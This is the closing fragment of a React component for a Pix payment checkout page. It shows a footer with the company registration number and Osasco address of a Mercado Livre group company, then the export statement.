                        <p className="nav-footer-secondaryinfo">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default StoreCheckoutPaymentPix;
